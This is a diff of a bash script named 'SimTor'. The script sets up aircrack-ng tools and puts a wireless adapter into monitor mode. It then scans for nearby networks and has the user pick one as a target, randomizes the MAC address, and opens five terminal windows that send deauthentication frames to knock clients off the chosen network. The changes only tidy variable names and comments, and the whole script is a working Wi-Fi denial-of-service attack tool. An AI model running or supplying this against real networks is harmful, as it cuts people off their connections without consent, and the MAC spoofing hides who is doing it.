@@ -27,13 +27,13 @@ echo "     SimTor – Package Installer"
 echo "====================================="
 echo -e "[+] Checking for required packages...\n"
 
-# Packages that are real Debian packages
+# Debian packages
 DEB_PKGS=("aircrack-ng" "macchanger" "xterm" "figlet")
 
-# Commands that must exist but are part of a package
+# Commands
 CMD_PKGS=("airmon-ng" "airodump-ng")
 
-# Check Debian packages
+# Checking Debian packages
 for pkg in "${DEB_PKGS[@]}"; do
     echo -n "Checking $pkg ... "
 
@@ -51,7 +51,7 @@ for pkg in "${DEB_PKGS[@]}"; do
     fi
 done
 
-# Check commands (like airmon-ng)
+# Checking commands (like airmon-ng)
 for cmd in "${CMD_PKGS[@]}"; do
     echo -n "Checking $cmd ... "
 
@@ -79,38 +79,36 @@ echo "====================================="
 # Step 1: Detect wireless adapter
 echo -e "\n[+] Checking for wireless adapter..."
 
-adapter_name=$(iwconfig 2>/dev/null | awk '/IEEE 802\.11/ {print $1; exit}')
+interface=$(iwconfig 2>/dev/null | awk '/IEEE 802\.11/ {print $1; exit}')
 
-if [ -z "$adapter_name" ]; then
+if [ -z "$interface" ]; then
     echo "[-] No wireless adapter detected."
     echo "    • Ensure WiFi device is connected"
     echo "    • Run:  rfkill unblock all"
     exit 1
 else
-    echo "[✔] Wireless interface detected: $adapter_name"
+    echo "[✔] Wireless interface detected: $interface"
 fi
 
 #==================================================
-# Step 2: Rename interface
+# Step 2: Renaming Adatptor
 echo -e "\n[+] Renaming wireless interface to 'simtor'..."
 
-new_name="simtor"
-
-if  ip link set "$adapter_name" down &&  ip link set "$adapter_name" name "$new_name"; then
-    echo "[✔] Renamed $adapter_name → $new_name"
+if  ip link set "$interface" down &&  ip link set "$interface" name "simtor" && ip link set "simtor" up; then
+    echo "[✔] Renamed $interface → simtor"
 else
     echo "[-] Failed to rename interface. Check permissions."
     exit 1
 fi
 
 #==================================================
-# Step 3: Enable monitor mode
-echo -e "\n[+] Setting interface '$new_name' to monitor mode..."
+# Step 3: Enabling monitor mode
+echo -e "\n[+] Setting interface 'simtor' to monitor mode..."
 
  airmon-ng check kill &>/dev/null
 
-if  airmon-ng start "$new_name" &>/dev/null; then
-    echo "[✔] Monitor mode enabled on ${new_name}mon"
+if  airmon-ng start "simtor" &>/dev/null; then
+    echo "[✔] Monitor mode enabled on simtor"
 else
     echo "[-] Failed to enable monitor mode."
     exit 1
@@ -129,11 +127,11 @@ SCAN_FILE="/tmp/simtor_scan"
 
 xterm -geometry 80x20+200+200 \
     -title "SimTor - Press Q to stop scanning" \
-    -e "airodump-ng --write '${SCAN_FILE}' --output-format csv ${new_name}"
+    -e "airodump-ng --write '${SCAN_FILE}' --output-format csv simtor"
 
 
 #==================================================
-# Step 5: Process scan results
+# Step 5: Processing scan results
 echo -e "\n[+] Processing scan results..."
 
 CSV="${SCAN_FILE}-01.csv"
@@ -179,7 +177,7 @@ while true; do
     break
 done
 
-# Extract BSSID, ESSID, CHAN from selected entry
+# Extracting BSSID, ESSID, CHAN from selected entry
 selected_entry="${simtor_networks[$selected]}"
 IFS=',' read -r SELECTED_BSSID SELECTED_ESSID SELECTED_CHAN <<< "$selected_entry"
 
@@ -194,7 +192,7 @@ echo ""
 echo "====================================="
 echo " SimTor –   MAC RANDOMIZER"
 echo "====================================="
-# Step 6: MAC Randomizer
+# Step 6: MAC Randomizing
 echo -e "[+] Initializing MAC Randomizer...\n"
 
 xterm -geometry 60x12+900+600 \
@@ -222,7 +220,6 @@ echo -e "[+] Launching deauth senders...\n"
 iwconfig simtor channel $SELECTED_CHAN
 declare -a PIDS=()
 
-# LEFT STACK (Senders 1,2,3)
 for i in 1 2 3; do
     xterm -geometry 60x12+50+$((i*180)) \
         -title "Sender $i" \
@@ -236,7 +233,6 @@ for i in 1 2 3; do
     PIDS+=($!)
 done
 
-# RIGHT STACK (Senders 4,5)
 for i in 4 5; do
     xterm -geometry 60x12+900+$(((i-3)*180)) \
         -title "Sender $i" \
